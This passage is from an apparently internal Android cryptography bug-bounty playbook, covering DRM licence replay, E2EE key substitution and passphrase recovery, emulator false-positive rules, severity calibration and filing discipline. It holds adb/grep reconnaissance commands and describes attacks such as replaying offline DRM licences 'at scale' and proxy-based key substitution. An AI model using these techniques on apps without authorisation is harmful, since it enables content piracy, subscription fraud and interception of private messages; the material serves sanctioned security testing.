| **Maps to** | `developer.android.com/media/media3/exoplayer/drm` — `MediaItem.DrmConfiguration.Builder`, `setKeySetId(byte[])`, `DefaultDrmSessionManager`, `setMultiSession()` |

- **Test:** Media3/ExoPlayer offline playback stores a licence key-set id alongside the downloaded media.
  If that blob is stored in app-private files with no account binding, it can be lifted and replayed into
  another install or account, or it survives subscription cancellation.
- **How:**
```bash
grep -rnE 'setKeySetId|OfflineLicenseHelper|DownloadHelper|DefaultDrmSessionManager|downloadLicense|releaseLicense|renewLicense|setMultiSession' out/sources/
adb shell run-as com.target.app sh -c "find . -path '*download*' -o -name '*.exo' -o -name 'downloads*'"
adb shell run-as com.target.app sh -c "sqlite3 databases/exoplayer_internal.db 'select * from ExoPlayerDownloads;'"
# copy the media + keySetId to a second device/account and play with the network disabled
```
- **Proof:** Downloaded content playing on a second device or under a cancelled or free account using the
  copied key-set id and media files, **with the network disabled** so no re-validation can occur.
- **Escalation:** Pairs with the D23 subscription and trial-abuse items — cancel, keep playing; repeatable
  at scale for a licensed catalogue.
- **Ruled out when:** The key-set id is bound to the account server-side (the copied blob fails on the
  second account) or the licence is re-validated online at playback with a check that an offline device
  cannot satisfy.

### D12-075 · `E2eeContactKeysManager` (Android 15) — silent key substitution

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies) |
| **Attacker** | AM-09 malicious backend / AM-08 |
| **Applies to** | **Android 15+** apps using the API |
| **Maps to** | `developer.android.com/about/versions/15/features` — `E2eeContactKeysManager`, "OS-level API for storing cryptographic public keys with platform contacts integration for centralized key management and verification" |

- **Test:** For a messaging app the verification UX and the key-change handling *are* the security
  boundary. Does the app surface a key change, and can another app read or write entries?
- **How:**
```bash
grep -rn 'E2eeContactKeysManager\|updateOrInsertE2eeContactKey\|getE2eeContactKey\|updateE2eeContactKeyLocalVerificationState' out/sources/
adb shell dumpsys contacts | grep -i 'e2ee\|contact_keys' 2>/dev/null
```
  Perform an out-of-band key rotation for a contact and observe whether the app warns.
- **Proof:** A key rotation performed out of band that the app accepts without a user-visible verification
  prompt or a safety-number change indicator.
- **Escalation:** → D14 (MITM on E2EE messaging).
- **Ruled out when:** A key change produces a blocking, user-visible verification prompt before any message
  is sent under the new key, and the local verification state is reset.

### D12-076 · E2EE key verification not performed, or the E2EE passphrase is low-entropy

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies); `cryptographic_weakness.insecure_key_generation.insufficient_key_stretching` (varies) for the passphrase half |
| **Attacker** | AM-09 / AM-05 |
| **Applies to** | messaging, file-sync and vault apps claiming end-to-end encryption |
| **Maps to** | H1 #1189162 (Nextcloud, "End to end encryption public key is not properly verified on Desktop and Android", **$1,500**); H1 #2546437 (Rocket.Chat, "The initial E2EE password generated by Rocket.Chat mobile can be recovered in a practical timescale") |

- **Test:** Two halves, and the verification half pays fifteen times what the hygiene half pays. Does the
  client verify the peer's public key against anything the server cannot forge, and is the generated E2EE
  passphrase drawn from a space large enough to resist recovery?
- **How:**
```bash
grep -rniE 'e2ee|endToEnd|publicKey|fingerprint|safetyNumber|verifyKey|trustOnFirstUse|TOFU' out/sources/ -B6 -A6
grep -rn 'generatePassword\|mnemonic\|wordlist\|BIP39\|randomPassword' out/sources/ -B6 -A10   # count the space
```
  Serve a substituted public key from a proxy and see whether the client notices; and enumerate the
  passphrase generator's space directly from the wordlist and the length constant.
- **Proof:** For the verification half, a message encrypted to **your** key after a server-side key
  substitution, accepted by the client with no warning. For the passphrase half, the arithmetic of the
  search space plus a recovery within a stated wall-clock time.
- **Escalation:** → D14 (server-mediated MITM on an "end-to-end encrypted" product — this contradicts the
  vendor's headline claim, which is what makes it pay), D11.
- **Ruled out when:** The client pins or out-of-band verifies the peer key (safety numbers, QR
  verification, a TOFU record that warns on change) and refuses to encrypt to an unverified key change,
  and the generated passphrase's space exceeds any practical search.

### D12-077 · Emulator Keystore artefacts that must NEVER be reported

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — this is a false-positive suppression rule |
| **Attacker** | AM-12 (harness) |
| **Applies to** | every emulator-based harness. **The caveat is absolute** |
| **Maps to** | source.android.com/docs/security/features/keystore/attestation `SecurityLevel` values (`Software`, `TrustedEnvironment`, `StrongBox`); `developer.android.com/privacy-and-security/security-key-attestation` ("check that `attestationSecurityLevel` is set to `TrustedEnvironment` or `StrongBox`"); `privacy-and-security/keystore` (probe `PackageManager.FEATURE_STRONGBOX_KEYSTORE`) |

- **Test:** On a standard AVD the Keystore is software-backed and the attestation chain terminates in
  Google's **Software** attestation root. Every one of the following is a property of your harness, not of
  the app: `KeyInfo.isInsideSecureHardware() == false`; `getSecurityLevel() == 0` / `SOFTWARE`;
  `attestationSecurityLevel: Software`; `StrongBoxUnavailableException`; "root detection bypassed".
  Reporting an emulator-only key-property observation as a device finding is the single most common way a
  mobile report is closed as informative.
- **How:**
```bash
adb shell getprop ro.kernel.qemu; adb shell getprop ro.hardware; adb shell getprop ro.product.model
adb shell pm list features | grep -iE 'strongbox|hardware_keystore'
# expect android.hardware.strongbox_keystore ABSENT on a stock AVD
```
  Then re-run the D12-004 `KeyInfo` script on a **physical device** and compare. The device-capability
  matrix to publish in the methodology section:
```
Emulator CANNOT authoritatively answer:
  - hardware-backed key attestation / StrongBox (isInsideSecureHardware, SecurityLevel, attestation chain)
  - real biometric enrolment paths and BiometricPrompt CryptoObject binding to a hardware key
  - Play Integrity device verdicts on a certified device (rooted/emulated => empty verdict)
  - NFC / HCE payment flows, SE / eSE, StrongBox-backed payment credentials
Emulator IS authoritative for:
  - IPC, intents, providers, deep links, WebView, storage, network, most business logic, and MOST CRYPTO MISUSE
    (algorithm, mode, IV, key provenance, purpose bitmask, PRNG, KDF, signature enforcement)
```
- **Proof:** The certificate chain from `keyStore.getCertificateChain(alias)` on the emulator terminating
  in "Android Keystore **Software** Attestation Root", versus a hardware root on the physical device. That
  difference is the reason the emulator observation must be discarded.
- **Escalation:** None — it prunes invalid findings. Its one legitimate *offensive* use is as a source of a
  genuine `SOFTWARE` chain for D12-066.
- **Ruled out when:** n/a — always apply it. Every hardware-backing claim in the report must carry the
  device model it was measured on, or it does not go in the report. Record the untested rows in the
  ruled-out register as "out of scope — hardware not provisioned", with the cost of adding it quoted.

### D12-078 · Auth-bound key generation failing without a lockscreen is a harness problem

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — prevents a fabricated crypto finding |
| **Attacker** | AM-12 (harness) |
| **Applies to** | all emulator work |
| **Maps to** | the emulator-artefact rule; `KeyguardManager.isDeviceSecure` |

- **Test:** A key with `setUserAuthenticationRequired(true)` **cannot be generated** on a device with no
  secure lock. "Key generation throws on a fresh emulator" is a test-environment problem, not a finding.
- **How:**
```bash
adb shell locksettings set-pin 1234
adb shell dumpsys window | grep -oE 'isKeyguardShowing=(true|false)'
# retry the flow; the same generation call now succeeds
```
- **Proof:** The identical generation call succeeding once a PIN is set, captured in the same session as
  the earlier failure.
- **Escalation:** Once the PIN is set you can run the D12-049 auth-window differential and the D12-050
  enrolment test properly. **Do not confuse this with D12-053** — that item is about the *app's fallback*
  when generation fails on a real user's lock-less device, which is a genuine finding; this item is about
  your own emulator.
- **Ruled out when:** n/a — always set a PIN before any Keystore auth work, and state that you did.

### D12-079 · The impact requirement — a crypto finding without a decryption or a forgery is Informational

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (severity governance for the whole chapter) |
| **Attacker** | AM-12 (discipline) |
| **Applies to** | every item in this chapter |
| **Maps to** | the 7-Question Gate (Q6: "prove impact beyond technically possible" — failing Q6 downgrades rather than kills); HackerOne Core Ineligible ("Optional security hardening steps / Missing best practices"); Google Mobile VRP non-qualifying "Hardcoded API keys"; Basecamp's exclusion and its escape hatch |

- **Test:** Before filing anything from this chapter, answer three questions in writing. **(1)** What is the
  key-material source, exactly — constant, derived, Keystore, server-delivered? **(2)** What does decrypting
  or forging give an attacker, in one concrete sentence? **(3)** Can you write step 2 of the PoC as a real
  copy-pasteable command or HTTP request? If you cannot write step 2, kill the finding.
- **How:** The calibration set to rate against:
  - **Meesho** used `AES/ECB` with a key equal to the first 16 characters of the access token, no IV and no
    MAC — payloads were short identifiers, over TLS, under a server-shared key ⇒ **Low, not a crypto break**.
  - **ivrodriguez's** correct, detailed report on UUID-as-key-and-salt reuse with no authentication tag was
    closed **Not applicable**: "Can you show a proof of concept on how you can exploit this issue?"
  - **Reverb.com** hardcoded Cloudinary API secret: **$0** at 96 upvotes. **Zenly** overly-permissive keys:
    $750. **8x8**, **Nord Security** hardcoded keys: $0. **Shopify** biometric bypass (#637194, Low): $500.
    **Nextcloud** E2EE verification (#1189162): **$1,500** versus uncleared keys (#1189168): $100.
  - The escape hatch, in Basecamp's own words: extracted secrets qualify "**unless chained with a
    demonstrated cross-user impact that does not require physical device access**". Build that chain or
    accept the rating.
- **Proof:** The decryption output or the forged-and-accepted request, in the report, with the commands.
- **Escalation:** n/a.
- **Ruled out when:** n/a — apply to every item before submission. A key sweep is twenty minutes of the
  week, not a day; the day goes on what the key opens.

### D12-080 · Severity and filing discipline for a crypto chain

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (reporting governance — see D27) |
| **Attacker** | AM-12 (discipline) |
| **Applies to** | every multi-step crypto finding |
| **Maps to** | the Pre-Severity Gate; chain-filing order; evidence hygiene; retraction discipline |

- **Test:** Crypto findings are almost always chains — extract key → decrypt store → replay token → reach
  data — and chains are where severity claims break.
- **How:**
  - **Pre-severity gate, run against the CRITICAL CLAIM, not the bug.** Write the draft Critical title and
    substitute the claim into each question: (1) Have I validated the full chain to attacker-attainable
    impact, or only one primitive in the middle? (2) What does the attacker walk away with, in one
    concrete sentence? (3) Have I reproduced the full chain end-to-end **at least twice**? (4) Is there an
    inheritance gate, signature check or audience check still gating the chain? (5) Has the program
    rejected this severity class before? The canonical failure is from this very domain: a JWT `alg:none`
    labelled Critical on a confirmed signature-bypass primitive, while the issuer-trust check still
    rejected unsigned tokens — the ATO never completed and the finding was retracted.
  - **Chain-filing order.** File the primitives first so their ids exist (the hardcoded key, the exported
    crypto receiver), then the consumer (the ATO), then backfill the links. **One fix equals one bounty; a
    chain is a severity amplifier, not a merge request.**
  - **Evidence hygiene.** Capture the five-screenshot state-change set: pre-state, the bug, the negative
    post-state (control), the positive post-state, and the side effect. Sanitise HARs. **Mask** production
    key bytes beyond the first and last four characters and other users' PII; **leave visible** trace ids,
    your own attacker uid/account id, JSON key names, algorithm strings, alias names and IV/nonce lengths —
    the triager needs those to reproduce.
  - **Retraction discipline, and its opposite.** Document a failed finding in a retraction appendix rather
    than dropping it silently; a clean 11-finding report with a retraction appendix is more trustworthy
    than a 13-finding report where two fall apart at triage. But **do not retract a confirmed finding that
    stopped reproducing because the client patched mid-engagement** — keep the timestamped pre-patch
    evidence and say so.
- **Proof:** The filed report structure itself — primitives first, ids cross-referenced, the five
  screenshots, the appendix.
- **Escalation:** n/a.
- **Ruled out when:** n/a — apply always.

## Graveyard for this domain

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| `KeyInfo.isInsideSecureHardware() == false` / `getSecurityLevel() == 0` on an emulator | A property of the AVD's software Keystore, not of the app. Physical devices report `TrustedEnvironment`/`StrongBox` | The same measurement on a **physical device**, with the model named, on a key the app documents as hardware-backed (D12-056) |
| `StrongBoxUnavailableException` on a device without `android.hardware.strongbox_keystore` | Documented behaviour of `setIsStrongBoxBacked(true)` on hardware that lacks StrongBox | The app's silent **software fallback** after the exception while the UI still claims hardware protection (D12-054) |
| Auth-bound key generation throwing on your lockscreen-less test device | Keys with `setUserAuthenticationRequired(true)` cannot be generated without a secure lock — set a PIN (D12-078) | The **app's** fallback to an unprotected key on a real user's lock-less device (D12-053) |
| "The app uses `Cipher.getInstance("AES")`" with no reachable secret | A grep hit. MASTG-TEST-0350 requires the "Further Validation" step: confirm the encrypted data is sensitive | Identical ciphertext blocks on real user data, or a block-swap the server accepts (D12-014) |
| `RSA/ECB/OAEPPadding` or `RSA/ECB/PKCS1Padding` reported as ECB mode | `ECB` is a JCA API placeholder for RSA; RSA does not use a block-cipher mode | Nothing — this is always a false positive. Do not file it |
| MD5 or SHA-1 present anywhere in the app | Usually a cache key, ETag, dedup id or a third-party library's bookkeeping | The digest deciding an integrity or authentication outcome, with a passing forged input (D12-016) |
| `new Random()` present anywhere in the app | MASTG-TEST-0204 requires the value to be "used for security-relevant purposes". UI jitter and shuffles are not | The predicted **next** value accepted by the app or server (D12-033) |
| IV reuse with no demonstrated consequence | `cryptographic_weakness.insufficient_entropy.initialization_vector_reuse` = **P5** | Recovered plaintext (CTR XOR) or a forged GCM tag (D12-020), or a padding oracle built on it (D12-018) |
| PRNG seed reuse with no demonstrated prediction | `.prng_seed_reuse` = **P5** | Seed recovery plus a first-attempt prediction the server accepts (D12-035, D12-036) |
| Same key used for two purposes inside one environment | `cryptographic_weakness.key_reuse.intra_environment` = **P5** | The same key across **prod and staging** = `key_reuse.inter_environment` **P2** (D12-030), or a built cross-protocol attack |
| Predictable salt on its own | `cryptographic_weakness.weak_hash.use_of_predictable_salt` = **P5** | Paired with a weak KDF and an executed offline brute force that recovers the plaintext (D12-026) |
| E2EE or session keys not cleared on logout | `cryptographic_weakness.incomplete_cleanup_of_keying_material` = **P5**; Nextcloud paid $100 for exactly this | The **verification** failure beside it, which paid $1,500 at the same programme (D12-076) |
| A hardcoded third-party API key (Maps, Sentry, Crashlytics, Firebase, Branch, Kinesis) | Google Mobile VRP: "Hardcoded API keys" flatly non-qualifying. Xiaomi, Spotify, Grab, Reddit exclude these by name. `sensitive_data_exposure.sensitive_data_hardcoded.oauth_secret` = **P5** | The key returning **customer data** or performing a privileged action — then it is `disclosure_of_secrets.for_publicly_accessible_asset` **P1** (D12-011) |
| An OAuth `client_secret` recovered from the mobile app | Never-submit. Public clients are not expected to hold a confidential secret; Xiaomi and Spotify name it out of scope explicitly | **PKCE non-enforcement** on the same flow is the reportable finding (D12-037), as is a weak `code_verifier` PRNG |
| An expired JWT found in the binary | `sensitive_data_exposure.disclosure_of_secrets.sensitive_information_disclosed_jwt` = **P5** | Its claim shape and path inventory driving a shadow-API version diff or a secret-recovery forge (D12-047 → D12-043/D12-044) |
| A named JCA provider (`getInstance(alg, "BC")`) | Often Informational under HackerOne rating; a compatibility issue as much as a security one | The bundled provider supplying a weak primitive the platform refuses, with the primitive shown in use (D12-070, D12-021) |
| An embedded OpenSSL version string in a bundled `.so` | `using_components_with_known_vulnerabilities.outdated_software_version` = **P5** without reachability | A Frida hook showing the app routing crypto/TLS through that module, plus a specific advisory (D12-072) |
| AES-128 reported as an insufficient key size | MASTG's AES-128 position is explicitly forward-looking ("considering quantum computing attacks") | RSA-1024 or below, EC below 224, or a 64-bit symmetric key (D12-025) |
| A Frida hook bypassing the biometric prompt on your own rooted device | Triage reads this as "root detection bypass" and closes it; AM-12 is not an attacker | The **absence of key binding** shown by a null `CryptoObject` plus the secret released (D12-048) |
| "The app does not use StrongBox" | A hardening observation, not a vulnerability, on a device class where StrongBox may not exist | Paired with a server that trusts a client-asserted hardware claim (D12-062 → D12-063) |
| Certificate pinning absent or defeatable | `mobile_security_misconfiguration.ssl_certificate_pinning.absent` / `.defeatable` = **P5**, and AM-07 (a trusted CA you installed) is a tester convenience, not an attacker | Belongs to D14 entirely; here it matters only as the means of capturing ciphertext for D12-018/D12-041 |
| Data stored unencrypted on internal storage | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` = **P5**; SELinux confines `/data/data` per app and `MODE_WORLD_*` throws at API 24+ | A demonstrated read primitive from D07/D08, or the same data on external storage (P4) — and it is D11's finding, not D12's |

## Cross-surface joins

- **D12 key provenance × D11 storage mode.** Everyone reviews "is the data encrypted?" and "where is the
  key?" separately, and both pass in isolation: the store is `EncryptedSharedPreferences` and the key is in
  `AndroidKeyStore`. The join is the master key's `KeyGenParameterSpec`: with `userAuthRequired=false` the
  encryption is defeated by any in-process primitive, so the D11 "encrypted at rest" mitigation is void and
  the D11 finding's severity should be recalculated. File the D12 key property as the primitive and attach
  it to the storage report — that is the pairing that turns a P5 storage note into a rated finding.
- **D12 Keystore-as-oracle × D05/D06/D07 exported components.** The IPC reviewer sees a receiver that takes
  a string and returns a string, and rates it Low because "it does not leak anything". The crypto reviewer
  sees a key with perfect hardware protection and rates it safe. Joined: the receiver is a decryption and
  signing oracle driven by any zero-permission app on the device (AM-03), and hardware protection of the
  *key* is irrelevant because the *capability* was exported. AOSP says this in its own security model and
  almost no checklist tests it (D12-058).
- **D12 hardcoded signing key × D12-043 shadow API × D15 business logic.** Three surfaces nobody joins. The
  binary's base URL points at `/v1/`; the current web app uses `/v3/`. The reverser recovers the `/v3/`
  signing scheme and spends a day on it — while `/v1/` never required a signature at all. Behaviourally
  diff every versioned path the binary knows about, with and without the signing headers, before reversing
  anything. This is the highest-yield structural move available in a mobile crypto review.
- **D12 weak PRNG × D04/D05 restart primitive.** A time-seeded `java.util.Random` is theoretically
  predictable and practically not — unless you can control *when* the process starts. The activity reviewer
  has a crash or a launcher intent and calls it a P5 DoS; the crypto reviewer has a seed with an unknown
  value. Joined, the seed space collapses to a few hundred milliseconds and the challenge becomes
  predictable on the first attempt (D12-036; the Galaxy Store chain's bug 4).
- **D12 key attestation × D21 root/RASP × D23 payments.** The RASP reviewer proves root detection can be
  bypassed and gets told "that requires a rooted device, out of scope". The crypto reviewer sees an
  attestation chain and assumes it is sound. Joined: the chain never binds to the session or the
  transaction, so a clean-device relay produces genuine hardware attestation for a rooted attacker, and
  every fraud control built on "this is a real, locked device" collapses — without breaking any
  cryptography (D12-068).
- **D12 auth-bound keys × the device's lock state.** Every checklist tests the key properties on a
  PIN-protected device. Nobody tests the no-secure-lock device — which is exactly the device a thief has —
  or the Smart Lock trusted-place device, where `setUnlockedDeviceRequired(true)` is satisfied while the
  phone sits unattended on a desk. Two device states in which the standard recommendations silently do
  nothing (D12-052, D12-053).
- **D12 crypto census × D19 framework detection.** The single largest false-negative generator in this
  domain is a clean `jadx/sources` crypto grep on a React Native or Flutter app. The framework reviewer
  knows the app is RN; the crypto reviewer records "no crypto misuse found". Joined, the same grep over the
  Hermes string table or the blutter object-pool dump returns the key, the storage-key names and the route
  table (D12-003).
- **D12 request signing × D14 pinning × D26 harness.** Pinning is P5 and worth nothing as a finding, but
  without defeating it you never see the signed request body, and without the signed body you cannot run
  the four-probe server-enforcement test that produces the actual P1. The join is procedural: D14 work is
  the *cost* of the D12 finding, so budget it first and never file it as a finding of its own.
- **D12 key reuse across installs × D18 backend multi-tenancy.** A shared key is P5 `intra_environment`
  until you can reach another user's ciphertext. The backend reviewer has an endpoint that returns an
  encrypted field for an arbitrary object id; the crypto reviewer has the key. Joined, you decrypt another
  tenant's data with a key from the public APK — cross-user impact with no physical access, which is
  precisely the exclusion escape hatch every program writes into its policy (D12-031).

## Sources

- **OWASP MASTG / MASVS / MASWE**: MASTG-TEST-0204, -0205, -0208, -0212, -0221, -0232, -0307, -0308, -0312,
  -0330, -0350; MASTG-KNOW-0011/-0012/-0013/-0043/-0047; MASTG-BEST-0001/-0005/-0009/-0020; MASTG-TECH-0033/-0043;
  MASTG-TOOL-0032/-0110/-0116/-0125/-0144; MASWE-0003, -0004, -0007, -0008, -0009, -0012, -0013, -0014,
  -0016, -0020, -0022, -0023, -0047; the `mastg-android-*` semgrep rule pack; the noted MASTG gaps (no
  Android test covers KDF misuse or MAC misuse).
- **Bugcrowd VRT release 2026-07-08** (581 entries): the full `cryptographic_weakness` subtree with its
  P2/P3/P4/P5 assignments, plus the `sensitive_data_exposure`, `insecure_os_firmware.hardcoded_password`
  and `broken_authentication_and_session_management` exits used throughout.
- **AOSP / source.android.com**: Hardware-backed Keystore (KeyMint TA in TrustZone, keystore daemon holds
  encrypted keyblobs, StrongBox as the secure-element variant); keystore authorization tags
  (`TAG_NO_AUTH_REQUIRED`, `TAG_AUTH_TIMEOUT`, `TAG_USER_AUTH_TYPE`, `TAG_USER_SECURE_ID`,
  `TAG_UNLOCKED_DEVICE_REQUIRED`); key attestation (`KeyDescription` ASN.1, `SecurityLevel`, `RootOfTrust`,
  tag [709] `attestationApplicationId`); the Conscrypt APEX; the Android Platform Security Model paper
  §4.3.8 (the Keystore-as-oracle argument, StrongBox as TRH, Titan M) and §4.7 (Verified Boot in
  attestation, VBMeta digest from Android 10).
- **developer.android.com**: `privacy-and-security/keystore`, `privacy-and-security/security-key-attestation`
  (server-side verification, first-occurrence extension rule, CRL and root endpoints, the 2026-02-01 EC root,
  RKP on Android 15/16, the `github.com/android/keyattestation` verifier), `identity/sign-in/biometric-auth`,
  `privacy-and-security/security-tips`, the `risks/` articles (hardcoded-cryptographic-secrets,
  broken-cryptographic-algorithm, weak-prng, unsafe-trustmanager, unsafe-hostname), Android 12/13/15/16
  behaviour-change and feature pages, `media/media3/exoplayer/drm`.
- **MITRE ATT&CK Mobile**: T1406 (with the LightSpy S1185 `AES-ECB` hardcoded-key, Pallas and Windshift
  procedure examples), T1521/.001/.002, T1533, T1617, T1635, T1641.001, T1474.001, T1426.
- **Program policy and economics**: Google Mobile VRP non-qualifying list and Google's own embedded-secrets
  guidance; Xiaomi, Spotify, Grab, Reddit and Basecamp mobile exclusions; Samsung VRP High/ineligible
  criteria; HackerOne Core Ineligible and Platform Standards AITM baseline.
- **Disclosed reports and empirical anchors**: H1 #824931 (Grammarly PKCE PRNG), #637194 (Shopify biometric
  bypass), #1189162 / #1189168 (Nextcloud E2EE verification vs cleanup), #2546437 (Rocket.Chat E2EE
  password), #638635, #3800870, #1760403, #1040786 (JWT classes); Reverb.com, Zenly, 8x8 and Nord Security
  hardcoded-key outcomes; the Samsung Galaxy Store chain's predictable-challenge bug.
- **Research and tooling**: Frida CodeShare `@fadeevab/intercept-android-apk-crypto-operations` and
  `@dzonerzy/aesinfo`; objection `android keystore list|detail|watch|clear` and its `keystore.ts` agent;
  MobSF and mobsfscan rule names and severities; QARK crypto rules; blutter and the reversethat.app
  DroidPass Smi-decoding analysis; the IQCrafter Flutter RSA-key and request-signing study; Il2CppDumper and
  pyxamstore; HackTricks (`bypass-biometric-authentication-android.md`,
  `android-anti-instrumentation-and-ssl-pinning-bypass.md`, `play-integrity-attestation-bypass.md`,
  `insecure-in-app-update-rce.md`); Oversecured "Use cryptography in mobile apps the right way";
  Mobile Hacking Lab's Frida crypto-extraction write-up; NowSecure's XTool AnyScan analysis
  (CVE-2025-63432/63433/63434/63435); SQLCipher's bundled-OpenSSL CVE thread
  (CVE-2023-3446, CVE-2024-2511, CVE-2024-4741, CVE-2024-5535); Google Play "Remediation for Bad OpenSSL
  Versions" and the ASI campaign list.
- **Bug-hunting discipline corpus**: the 7-Question Gate, the Pre-Severity Gate (with its retracted
  `alg:none` Critical), Marker Discipline, the Body-Diff Rule, the Statistical-Sample Rule, the
  Shell-Loop Ban, the Multi-Tool Reproduction Bar, Server-Policy-vs-State, the layer-ordering trap, the
  shadow-API behavioural-diff doctrine, evidence hygiene and the five-screenshot state-change pattern,
  retraction discipline and its mid-engagement-patch exception, and chain-filing order.
- **Local senior-researcher corpus**: the emulator-artefact rules (§B5), the keyguard-asserted auth-window
  differential (§B6), the Meesho ECB calibration, the ivrodriguez "not applicable" story, the device
  capability matrix, and the RN/Flutter false-negative rule.
